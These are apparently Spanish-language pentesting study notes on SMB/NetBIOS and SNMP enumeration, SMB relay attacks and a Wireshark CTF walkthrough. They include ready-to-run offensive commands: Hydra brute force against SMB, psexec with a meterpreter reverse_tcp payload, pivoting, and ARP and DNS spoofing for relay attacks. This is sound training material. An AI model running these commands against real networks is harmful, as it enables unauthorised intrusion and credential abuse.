----
# SMB AND NETBIOS ENUMERATION

## ¿QUÉ ES NETBIOS?

**NetBIOS (Network Basic Input/Output System)** es una **API/protocolo antiguo** que proporciona **servicios de comunicación en redes locales**, principalmente en entornos Windows legacy.

👉 No es un protocolo de transporte completo, sino una **capa de servicios**.

## SERVICIOS PRINCIPALES DE NETBIOS

### 🔹 1. Name Service — **Puerto 137/UDP**

Sirve para:

- resolución de nombres NetBIOS → IP
- identificar hosts en la red local

Ejemplo:

> “¿Quién es SERVER01?”
### 🔹 2. Datagram Service — **Puerto 138/UDP**

Sirve para:

- envío de mensajes sin conexión
- broadcasts en la red local

Ejemplo:

- anuncios
- mensajes de estado
### 🔹 3. Session Service — **Puerto 139/TCP**

Sirve para:

- establecer sesiones persistentes
- transferencia de datos
- base de SMB sobre NetBIOS

📌 SMB antiguo funciona aquí.
## ¿QUÉ ES SMB?

**SMB (Server Message Block)** es un **protocolo de compartición de recursos**, usado para:

- compartir archivos
- compartir impresoras
- autenticación
- ejecución remota (con credenciales)
## VERSIONES DE SMB

- **SMB 1.0**    
    - muy antiguo
    - **vulnerable**
    - EternalBlue (MS17-010)

- **SMB 2.0 / 2.1**
    - Windows Vista / 7
    - mejoras de rendimiento
    
- **SMB 3.0**
    - Windows 8+
    - añade:
        - cifrado
        - multicanal
        - mejoras en virtualización
## PUERTOS CLAVE

- **445/TCP** → SMB moderno (directo sobre TCP)
- **139/TCP** → SMB sobre NetBIOS (Session Service)
- `netbios-ssn` → nombre del servicio en 139
## ENUMERACIÓN NETBIOS

### 🔹 Escanear una red/subred

`nbtscan 192.168.1.0/24`
### 🔹 Escanear host usando NetBIOS

`nbtscan IP`
### 🔹 Resolver nombres NetBIOS

`nmblookup -A IP_VICTIMA`

Devuelve:

- nombre del host
- workgroup/dominio
- roles
## ENUMERACIÓN SMB CON NMAP

### 🔹 Escaneo básico

`nmap -sV -p 139,445 IP`
### 🔹 Protocolos SMB soportados

`nmap -p 445 --script smb-protocols IP`
### 🔹 Ver scripts SMB disponibles

`ls -la /usr/share/nmap/scripts/ | grep smb-`
### 🔹 Modo de seguridad SMB (IMPORTANTE)

`nmap -p 445 --script smb-security-mode IP`

👉 Te dice:
- si permite guest
- si SMB signing está activado
### 🔹 Enumerar usuarios SMB

`nmap -p 445 --script smb-enum-users IP`
## ENUMERACIÓN MANUAL SMB

### 🔹 Listar shares sin credenciales

`smbclient -L //IP -N`
## ATAQUES CONTRA SMB

### 🔹 Fuerza bruta con Hydra

`hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://IP`
### 🔹 Ejecución remota con Impacket PsExec

`impacket-psexec Administrator@IP`

👉 Requiere:

- credenciales válidas
- o NTLM hash
## METASPLOIT – SMB PSEXEC

`search exploit/smb/psexec use exploit/windows/smb/psexec set RHOSTS IP set SMBUser administrator set SMBPass password`

Si falla en sistemas modernos:

`set payload windows/x64/meterpreter/reverse_tcp`
## PIVOTING (MOVIMIENTO A OTRA RED)

### 🔹 Ver conectividad desde la víctima

`shell ping IP_INTERNA`
### 🔹 Añadir ruta en Metasploit

`run autoroute -s IP/SUBNET`
`background`
## PROXYING CON SOCKS (METASPLOIT)

### 🔹 Ver configuración de proxychains

`cat /etc/proxychains.conf cat /etc/proxychains4.conf`
### 🔹 Levantar SOCKS proxy

`search socks_proxy use auxiliary/server/socks_proxy set VERSION 4a set SRVPORT 9050 exploit`
### 🔹 Comprobar que está activo

`netstat -antp`
### 🔹 Escanear red interna vía proxy

`proxychains nmap demo1.ine.local -sU -Pn -sV -p 445`
## ENUMERACIÓN DESDE WINDOWS (POST-EXPLOTACIÓN)

Desde una sesión Meterpreter:

`migrate -N explorer.exe shell`
### 🔹 Ver recursos compartidos

`net view IP2`
### 🔹 Montar shares

`net use D: \\IP2\Documents net use K: \\IP2\K`
### 🔹 Acceder

`dir D:`

----
# SNMP (Simple Network Management Protocol)

---

## ¿QUÉ ES SNMP?

**SNMP** es un **protocolo de red** usado para **monitorizar y gestionar dispositivos de red**, como:

- routers
- switches
- firewalls
- impresoras
- servidores
- dispositivos IoT

Permite a los administradores:

- consultar el estado de los dispositivos
- obtener métricas (CPU, memoria, interfaces)
- modificar ciertas configuraciones
- recibir alertas (**traps**) cuando ocurre un evento

👉 En pentesting: **fugas masivas de información si está mal configurado**.
## ¿CÓMO FUNCIONA SNMP?

SNMP usa **UDP** y se basa en un modelo **manager ↔ agent**.

## COMPONENTES PRINCIPALES DE SNMP

### 🔹 1. SNMP Manager

- Sistema que **consulta y controla**    
- Envía peticiones SNMP (GET, WALK, SET)
- Recibe traps

Ejemplo:

- servidor de monitorización
- herramienta de administración
### 🔹 2. SNMP Agent

- Software que corre en el dispositivo
- Responde a consultas del manager
- Envía **traps** cuando ocurre algo importante

Ejemplo:

- agente SNMP en un router o servidor
### 🔹 3. MIB (Management Information Base)

- **Base de datos jerárquica**
- Define **qué información puede obtenerse**
- Cada dato tiene un **OID (Object Identifier)**

Ejemplo de OID:

`1.3.6.1.2.1.1.1.0`

👉 Esto puede representar:

- nombre del sistema
- versión
- uptime
- interfaces de red
## VERSIONES DE SNMP

### 🔴 SNMPv1

- Muy antiguo
- Sin cifrado
- Usa **community strings**
- Inseguro
### 🟠 SNMPv2c

- Mejora de rendimiento
- Sigue usando **community strings**
- **Sin cifrado**
- Muy común (y peligroso)
### 🟢 SNMPv3

- Autenticación
- Cifrado
- Control de acceso
- **La única versión segura**
## PUERTOS USADOS POR SNMP

- **161/UDP** → consultas SNMP (GET, WALK)
- **162/UDP** → traps (notificaciones)
## ¿QUÉ ES UNA COMMUNITY STRING?

Una **community string** es como una **contraseña en texto plano**.

Valores típicos:

- `public` → solo lectura
- `private` → lectura/escritura

📌 Muchas veces:

- no se cambia
- está expuesta
- permite leer toda la info del sistema
## SNMP ENUMERATION – ¿QUÉ BUSCAMOS?

- dispositivos con SNMP habilitado
- community strings débiles
- información del sistema
- interfaces de red
- direcciones IP internas
- rutas
- usuarios (en algunos sistemas)
- servicios y procesos

👉 SNMP es **oro para reconocimiento**.
## ENUMERACIÓN CON NMAP

### 🔹 Detectar SNMP

`nmap -sU -p 161 IP`
### 🔹 Ver scripts SNMP disponibles

`ls -la /usr/share/nmap/scripts/ | grep snmp`
### 🔹 Obtener versión SNMP

`nmap -sU -p 161 --script snmp-version IP`
### 🔹 Fuerza bruta de community strings

`nmap -sU -p 161 --script snmp-brute IP`
### 🔹 Ejecutar todos los scripts SNMP

`nmap -sU -p 161 --script snmp-* IP > snmp_info`
## ENUMERACIÓN CON SNMPWALK

### 🔹 Usando community string por defecto

`snmpwalk -v 1 -c public IP`

Esto:

- vuelca **toda la MIB accesible**
- da mucha información
- es difícil de leer al principio

📌 Muy útil si funciona.
### 🔹 OIDs interesantes

- Información del sistema:

`snmpwalk -v 2c -c public IP 1.3.6.1.2.1.1`

- Interfaces de red:

`snmpwalk -v 2c -c public IP 1.3.6.1.2.1.2`

## ¿HAY EXPLOTACIÓN DIRECTA?

Normalmente:

- **SNMP no da RCE directa**
- pero da **información crítica** que permite:
    
    - movimiento lateral
    - ataques SMB / SSH
    - descubrimiento de red interna

Ejemplo:

- IPs internas
- nombres de hosts
- usuarios
- rutas

---
# SMB RELAY ATTACKS

## ¿QUÉ ES UN SMB RELAY ATTACK?

Un **SMB Relay Attack** es un tipo de ataque en el que un atacante:

- **intercepta tráfico SMB**
- **captura una autenticación NTLM**
- **la reenvía (“relay”) a otro servidor legítimo**
- **sin necesidad de crackear la contraseña**

Es muy común en **redes Windows**, especialmente cuando:

- NTLM está habilitado
- SMB signing no está forzado

👉 No se rompen hashes, **se reutilizan en tiempo real**.
## ¿CÓMO FUNCIONA UN SMB RELAY ATTACK? (CLAVE)

### 1️⃣ Intercepción (MITM)

El atacante se coloca como **Man-in-the-Middle** entre la víctima y la red.

Esto puede lograrse mediante:

- **ARP spoofing**
- **DNS poisoning**
- **rogue SMB server** (servidor SMB malicioso)

👉 El objetivo es que la víctima **se autentique contra el atacante**.
### 2️⃣ Captura de la autenticación NTLM

Cuando un cliente Windows intenta acceder a un recurso SMB:

- envía un **challenge-response NTLM**
- **no envía la contraseña en claro**
- el atacante captura ese **hash NTLM**

📌 Importante:

> **El hash no se crackea**, se reutiliza.
### 3️⃣ Relé hacia un servidor legítimo

El atacante:

- toma el hash NTLM capturado
- lo **reenvía a otro servidor** que confía en NTLM
- el servidor cree que la autenticación es legítima

👉 El atacante **se hace pasar por la víctima**.
### 4️⃣ Obtención de acceso

Si el servidor destino:

- no tiene SMB signing
- acepta NTLM

Entonces el atacante puede:

- acceder a shares
- ejecutar comandos
- crear servicios
- obtener shell
- **moverse lateralmente**

🔥 Si la víctima es admin → impacto crítico.

## CONDICIONES NECESARIAS PARA EL ATAQUE

- NTLM habilitado    
- SMB signing **NO forzado**
- víctima inicia autenticación (automática o inducida)
- atacante en la misma red (o con MITM)
## EXPLOTACIÓN CON METASPLOIT

### 1️⃣ Preparar Metasploit

`msfconsole search smb_relay`

👉 Este módulo:

- levanta un servidor SMB malicioso
- relaya autenticaciones NTLM capturadas
### 2️⃣ Configuración del módulo

`set SRVHOST NUESTRA_IP`
`set LHOST NUESTRA_IP `      
`set SMBHOST IP_SERVER_SMB
## FORZAR A LA VÍCTIMA A AUTENTICARSE

Aquí viene la parte “activa” del ataque.
### 🧪 DNS SPOOFING

Crear archivo DNS falso:

`echo "NUESTRA_IP *.spoof.com" > dns`

Esto fuerza que cualquier petición a `*.spoof.com` resuelva a nosotros.

Ejecutar DNS spoofing:

`dnsspoof -i eth1 -f dns`

👉 Cuando la víctima intenta acceder a algo:

- se resuelve a nuestra IP
- intenta autenticarse por SMB

### 🧪 ARP SPOOFING (MITM)

Habilitar forwarding:

`echo 1 > /proc/sys/net/ipv4/ip_forward`

Envenenar ARP (víctima → router):

`arpspoof -i eth1 -t IP_VICTIMA IP_ROUTER`

Envenenar ARP (router → víctima):

`arpspoof -i eth1 -t IP_ROUTER IP_VICTIMA`

👉 Ahora todo el tráfico pasa por nosotros.

----
# CTF – ANÁLISIS DE TRÁFICO (WIRESHARK)

## 🏁 FLAG 1 – IP destino con respuesta 200 OK

### Pasos:

1. Abrir la captura en **Wireshark**
2. Filtrar por HTTP:

`http`

3. Buscar una respuesta:

`HTTP/1.1 200 OK`

4. Anotar la **IP destino** de esa respuesta

👉 Esa es la IP/host al que accedió el usuario infectado.
## 🏁 FLAG 2 – IP y MAC del cliente infectado

### Pasos:

1. Ir a paquetes **Ethernet**
2. Observar:
    - **IP origen**
    - **MAC origen**

Campos clave:

- `Ethernet II → Source`
- `Internet Protocol → Source`

👉 Corresponden al **Windows client infectado**.
## 🏁 FLAG 3 – Hostname vía NetBIOS

### Filtro:

`nbns`

(nbns = NetBIOS Name Service)

### Pasos:

1. Buscar paquetes **NBNS Query**
2. En el campo **Name**
3. Identificar el **hostname del sistema**

👉 NetBIOS revela el nombre del equipo en texto claro.
## 🏁 FLAG 4 – Usuario que ejecuta `mystery_file.ps1`

### Pasos:

1. Usar la lupa 🔍 y buscar:

`mystery_file.ps1`

2. Activar:
    - **Packet Bytes**
    - **Narrow / Wide**
    - **Strings**
3. Ir al campo **Data**

👉 En el payload se ve el **usuario en texto claro** que ejecuta el script.
## 🏁 FLAG 5 – User-Agent de PowerShell

### Pasos:

1. Buscar **PowerShell**
2. Ver cabecera:

`User-Agent`

Resultado típico:

`WindowsPowerShell`

👉 Indica tráfico generado por un **script PowerShell**, no por un navegador.

## 🏁 FLAG 6 – Wallet / Coinbase

### Pasos:

1. Buscar:

`Coinbase`

2. Click derecho sobre el paquete
3. **Follow → TCP Stream**
4. Analizar el stream completo

👉 Aparece información relacionada con **Coinbase / wallet extension**.
